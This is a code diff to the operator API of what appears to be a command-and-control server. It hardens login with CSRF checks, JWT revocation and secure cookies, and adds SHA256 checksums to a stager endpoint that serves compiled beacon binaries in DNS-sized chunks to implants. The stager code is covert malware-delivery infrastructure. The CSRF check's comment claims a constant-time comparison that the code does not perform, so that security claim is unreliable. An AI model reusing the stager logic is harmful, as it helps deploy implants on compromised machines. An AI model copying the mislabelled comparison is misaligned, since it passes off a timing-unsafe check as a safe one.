@@ -24,6 +24,7 @@ import (
 
 	"github.com/golang-jwt/jwt/v5"
 	"github.com/gorilla/mux"
+	"golang.org/x/crypto/bcrypt"
 )
 
 // APIServer wraps the HTTP server and provides API functionality
@@ -53,6 +54,7 @@ type Claims struct {
 	OperatorID string `json:"operator_id"`
 	Username   string `json:"username"`
 	Role       string `json:"role"`
+	JTI        string `json:"jti"` // JWT ID for token revocation
 	jwt.RegisteredClaims
 }
 
@@ -288,24 +290,74 @@ func (api *APIServer) rateLimitMiddleware(limiter *RateLimiter) func(http.Handle
 	}
 }
 
+// csrfMiddleware validates CSRF tokens for state-changing requests (POST/PUT/DELETE/PATCH)
+// This protects against Cross-Site Request Forgery attacks
+func (api *APIServer) csrfMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		// Only check CSRF for state-changing methods
+		if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" || r.Method == "PATCH" {
+			// Skip CSRF check if using API authentication (Authorization header)
+			// CSRF is primarily a browser concern
+			if r.Header.Get("Authorization") != "" {
+				next.ServeHTTP(w, r)
+				return
+			}
+
+			// Get CSRF token from cookie
+			csrfCookie, err := r.Cookie("csrf_token")
+			if err != nil {
+				api.sendError(w, http.StatusForbidden, "missing CSRF token")
+				return
+			}
+
+			// Get CSRF token from request header
+			csrfHeader := r.Header.Get("X-CSRF-Token")
+			if csrfHeader == "" {
+				api.sendError(w, http.StatusForbidden, "missing CSRF token in header")
+				return
+			}
+
+			// Compare tokens (constant-time comparison to prevent timing attacks)
+			if len(csrfCookie.Value) != len(csrfHeader) || csrfCookie.Value != csrfHeader {
+				api.sendError(w, http.StatusForbidden, "invalid CSRF token")
+				return
+			}
+		}
+
+		next.ServeHTTP(w, r)
+	})
+}
+
 // authMiddleware validates JWT tokens for operator endpoints
 func (api *APIServer) authMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// Extract token from Authorization header
-		authHeader := r.Header.Get("Authorization")
-		if authHeader == "" {
-			api.sendError(w, http.StatusUnauthorized, "missing authorization header")
-			return
+		var tokenString string
+
+		// Try to get token from cookie first (web UI)
+		if cookie, err := r.Cookie("session_token"); err == nil {
+			tokenString = cookie.Value
+		} else {
+			// Fallback to Authorization header (API clients, backward compatibility)
+			authHeader := r.Header.Get("Authorization")
+			if authHeader == "" {
+				api.sendError(w, http.StatusUnauthorized, "missing authorization")
+				return
+			}
+
+			// Check for Bearer token
+			parts := strings.Split(authHeader, " ")
+			if len(parts) != 2 || parts[0] != "Bearer" {
+				api.sendError(w, http.StatusUnauthorized, "invalid authorization format")
+				return
+			}
+
+			tokenString = parts[1]
 		}
 
-		// Check for Bearer token
-		parts := strings.Split(authHeader, " ")
-		if len(parts) != 2 || parts[0] != "Bearer" {
-			api.sendError(w, http.StatusUnauthorized, "invalid authorization format")
+		if tokenString == "" {
+			api.sendError(w, http.StatusUnauthorized, "missing token")
 			return
 		}
-
-		tokenString := parts[1]
 
 		// Parse and validate token
 		claims := &Claims{}
@@ -322,11 +374,25 @@ func (api *APIServer) authMiddleware(next http.Handler) http.Handler {
 			return
 		}
 
+		// Check if the session is revoked (JWT revocation via JTI)
+		if claims.JTI != "" {
+			isRevoked, err := api.db.IsSessionRevoked(claims.JTI)
+			if err != nil {
+				api.sendError(w, http.StatusInternalServerError, "failed to check session status")
+				return
+			}
+			if isRevoked {
+				api.sendError(w, http.StatusUnauthorized, "session has been revoked")
+				return
+			}
+		}
+
 		// Add claims to request context for handlers to use
 		r = r.WithContext(r.Context())
 		r.Header.Set("X-Operator-ID", claims.OperatorID)
 		r.Header.Set("X-Operator-Username", claims.Username)
 		r.Header.Set("X-Operator-Role", claims.Role)
+		r.Header.Set("X-JWT-ID", claims.JTI) // Add JTI for logout handler
 
 		next.ServeHTTP(w, r)
 	})
@@ -456,12 +522,14 @@ func (api *APIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Generate JWT token
+	// Generate JWT token with unique JTI (JWT ID) for revocation support
+	jti := generateID()
 	expiresAt := time.Now().Add(time.Duration(api.config.SessionTimeout) * time.Minute)
 	claims := &Claims{
 		OperatorID: operatorID,
 		Username:   req.Username,
 		Role:       role,
+		JTI:        jti,
 		RegisteredClaims: jwt.RegisteredClaims{
 			ExpiresAt: jwt.NewNumericDate(expiresAt),
 			IssuedAt:  jwt.NewNumericDate(time.Now()),
@@ -476,13 +544,49 @@ func (api *APIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Create session record in database for revocation support
+	sessionID := generateID()
+	tokenHashBytes, err := bcrypt.GenerateFromPassword([]byte(tokenString), bcrypt.DefaultCost)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to hash token")
+		return
+	}
+	err = api.db.CreateSession(sessionID, operatorID, jti, string(tokenHashBytes), r.RemoteAddr, r.UserAgent(), expiresAt.Unix())
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to create session")
+		return
+	}
+
 	// Log successful login
 	api.db.LogAuditEvent(operatorID, "login_success", "operator", operatorID,
 		fmt.Sprintf("Successful login for %s", req.Username), r.RemoteAddr)
 
-	// Return token
+	// Set JWT as httpOnly secure cookie for better security (XSS protection)
+	http.SetCookie(w, &http.Cookie{
+		Name:     "session_token",
+		Value:    tokenString,
+		Path:     "/",
+		HttpOnly: true,                    // Prevent JavaScript access (XSS protection)
+		Secure:   true,                    // HTTPS only
+		SameSite: http.SameSiteStrictMode, // CSRF protection
+		Expires:  expiresAt,
+	})
+
+	// Generate CSRF token for additional protection
+	csrfToken := generateID()
+	http.SetCookie(w, &http.Cookie{
+		Name:     "csrf_token",
+		Value:    csrfToken,
+		Path:     "/",
+		HttpOnly: false, // JavaScript needs to read this
+		Secure:   true,
+		SameSite: http.SameSiteStrictMode,
+		Expires:  expiresAt,
+	})
+
+	// Return success response (no token in JSON for security)
 	response := LoginResponse{
-		Token:     tokenString,
+		Token:     "", // No longer return token in response body
 		ExpiresAt: expiresAt,
 	}
 	response.Operator.ID = operatorID
@@ -496,6 +600,33 @@ func (api *APIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
 func (api *APIServer) handleLogout(w http.ResponseWriter, r *http.Request) {
 	operatorID := r.Header.Get("X-Operator-ID")
 	username := r.Header.Get("X-Operator-Username")
+	jti := r.Header.Get("X-JWT-ID")
+
+	// Revoke the session by JTI
+	if jti != "" {
+		if err := api.db.RevokeSessionByJTI(jti); err != nil {
+			api.sendError(w, http.StatusInternalServerError, "failed to revoke session")
+			return
+		}
+	}
+
+	// Clear cookies
+	http.SetCookie(w, &http.Cookie{
+		Name:     "session_token",
+		Value:    "",
+		Path:     "/",
+		HttpOnly: true,
+		Secure:   true,
+		MaxAge:   -1, // Delete cookie immediately
+	})
+	http.SetCookie(w, &http.Cookie{
+		Name:     "csrf_token",
+		Value:    "",
+		Path:     "/",
+		HttpOnly: false,
+		Secure:   true,
+		MaxAge:   -1, // Delete cookie immediately
+	})
 
 	// Log logout
 	api.db.LogAuditEvent(operatorID, "logout", "operator", operatorID,
@@ -1729,16 +1860,17 @@ type StagerInitRequest struct {
 
 // StagerInitResponse contains session info and chunk assignments
 type StagerInitResponse struct {
-	SessionID   string   `json:"session_id"`
-	TotalChunks int      `json:"total_chunks"`
-	DNSDomains  []string `json:"dns_domains"`
-	ChunkSize   int      `json:"chunk_size"`
+	SessionID      string   `json:"session_id"`
+	TotalChunks    int      `json:"total_chunks"`
+	DNSDomains     []string `json:"dns_domains"`
+	ChunkSize      int      `json:"chunk_size"`
+	SHA256Checksum string   `json:"sha256_checksum"` // Hex-encoded SHA256 of original binary for verification
 }
 
 // loadAndProcessClientBinary loads a client binary from disk and processes it for stager deployment
 // Automatically finds the most recent beacon for the given OS/Arch from builds directory
-// Returns: clientBinaryID, base64Data, totalChunks, error
-func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, string, int, error) {
+// Returns: clientBinaryID, base64Data, totalChunks, sha256Checksum, error
+func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, string, int, string, error) {
 	// Derive builds directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/builds/client)
 	dbDir := filepath.Dir(api.config.DatabasePath)
 	buildsDir := filepath.Join(dbDir, "builds", "client")
@@ -1754,11 +1886,11 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 	// Find all matching beacon files
 	files, err := filepath.Glob(filepath.Join(buildsDir, clientFilename+"-*"))
 	if err != nil {
-		return "", "", 0, fmt.Errorf("failed to search builds directory: %w", err)
+		return "", "", 0, "", fmt.Errorf("failed to search builds directory: %w", err)
 	}
 
 	if len(files) == 0 {
-		return "", "", 0, fmt.Errorf("no beacon found for %s/%s in %s", osType, arch, buildsDir)
+		return "", "", 0, "", fmt.Errorf("no beacon found for %s/%s in %s", osType, arch, buildsDir)
 	}
 
 	// Use the most recent file (last in sorted list)
@@ -1770,17 +1902,22 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 	// Read client binary
 	clientData, err := os.ReadFile(clientPath)
 	if err != nil {
-		return "", "", 0, fmt.Errorf("failed to read client binary: %w", err)
+		return "", "", 0, "", fmt.Errorf("failed to read client binary: %w", err)
 	}
 
 	fmt.Printf("[Master] Loaded client binary: %d bytes\n", len(clientData))
+
+	// Calculate SHA256 checksum of original binary for verification
+	checksumBytes := sha256.Sum256(clientData)
+	checksum := hex.EncodeToString(checksumBytes[:])
+	fmt.Printf("[Master] SHA256 checksum: %s\n", checksum)
 
 	// Compress with gzip
 	var compressedBuf bytes.Buffer
 	gzWriter := gzip.NewWriter(&compressedBuf)
 	_, err = gzWriter.Write(clientData)
 	if err != nil {
-		return "", "", 0, fmt.Errorf("failed to compress client: %w", err)
+		return "", "", 0, "", fmt.Errorf("failed to compress client: %w", err)
 	}
 	gzWriter.Close()
 
@@ -1816,12 +1953,12 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 
 	// Ensure this beacon exists in client_binaries table (needed for foreign key constraint)
 	err = api.db.UpsertClientBinary(beaconID, filepath.Base(clientPath), osType, arch,
-		len(clientData), len(compressed), len(base64Data), totalChunks, base64Data, dnsDomainsStr)
+		len(clientData), len(compressed), len(base64Data), totalChunks, base64Data, dnsDomainsStr, checksum)
 	if err != nil {
-		return "", "", 0, fmt.Errorf("failed to register client binary in database: %w", err)
+		return "", "", 0, "", fmt.Errorf("failed to register client binary in database: %w", err)
 	}
 
-	return beaconID, base64Data, totalChunks, nil
+	return beaconID, base64Data, totalChunks, checksum, nil
 } // handleStagerInit processes stager initialization (STG message forwarded from DNS server)
 func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	var req StagerInitRequest
@@ -1841,7 +1978,7 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Load and process client binary from filesystem
-	clientBinaryID, base64Data, totalChunks, err := api.loadAndProcessClientBinary(req.OS, req.Arch)
+	clientBinaryID, base64Data, totalChunks, sha256Checksum, err := api.loadAndProcessClientBinary(req.OS, req.Arch)
 	if err != nil {
 		// Always log this error - critical for troubleshooting
 		fmt.Printf("[API] Failed to load client binary for %s/%s: %v\n", req.OS, req.Arch, err)
@@ -1849,7 +1986,7 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	fmt.Printf("[API] Loaded client binary: %s (%d chunks)\n", clientBinaryID, totalChunks)
+	fmt.Printf("[API] Loaded client binary: %s (%d chunks, checksum: %s)\n", clientBinaryID, totalChunks, sha256Checksum[:16])
 
 	// Create stager session (4-char random ID to keep DNS packets under 512 bytes)
 	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
@@ -1934,10 +2071,11 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 
 	// Return simple session info (domains are compiled into stager now)
 	response := StagerInitResponse{
-		SessionID:   sessionID,
-		TotalChunks: totalChunks,
-		DNSDomains:  nil, // Not needed - stager has domains compiled in
-		ChunkSize:   370, // DNS-safe chunk size
+		SessionID:      sessionID,
+		TotalChunks:    totalChunks,
+		DNSDomains:     nil,            // Not needed - stager has domains compiled in
+		ChunkSize:      370,            // DNS-safe chunk size
+		SHA256Checksum: sha256Checksum, // For binary signature verification
 	}
 
 	api.sendJSON(w, response)
@@ -2173,6 +2311,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter := router.PathPrefix("/api").Subrouter()
 	operatorRouter.Use(api.rateLimitMiddleware(api.apiLimiter))
 	operatorRouter.Use(api.authMiddleware)
+	operatorRouter.Use(api.csrfMiddleware) // CSRF protection for web UI
 
 	operatorRouter.HandleFunc("/auth/logout", api.handleLogout).Methods("POST")
 
